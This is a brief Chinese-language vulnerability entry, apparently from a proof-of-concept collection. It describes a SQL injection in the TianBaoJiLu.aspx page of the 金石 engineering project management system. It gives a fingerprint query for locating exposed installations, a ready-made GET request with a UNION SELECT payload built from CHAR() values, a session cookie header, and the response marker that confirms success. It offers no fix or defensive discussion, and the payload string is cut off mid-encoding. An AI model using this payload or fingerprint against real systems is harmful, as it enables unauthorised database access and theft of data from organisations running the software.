# 金石工程项目管理系统TianBaoJiLu.aspxSQL注入漏洞

- **系统**：金石工程项目管理系统TianBaoJiLu.aspx　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="金石工程项目管理系统"`
- **请求**：`GET /query/shigongjihuajindu/TianBaoJiLu.aspx?id=1+UNION+ALL+SELECT+18%2C18%2C18%2C18%2CCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2882%29%2BCHAR%2888%29%2BCHAR%28110%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%2880%29%2BCHAR%2899%29%2BCHAR%2872%29%2BCHAR%2880%2`
- **关键头**：`Cookie: ASP.NET_SessionId=ab24yccirwx3vybjjvf3ldqr`
- **预期**：200　|　qkvzqRXnTXPc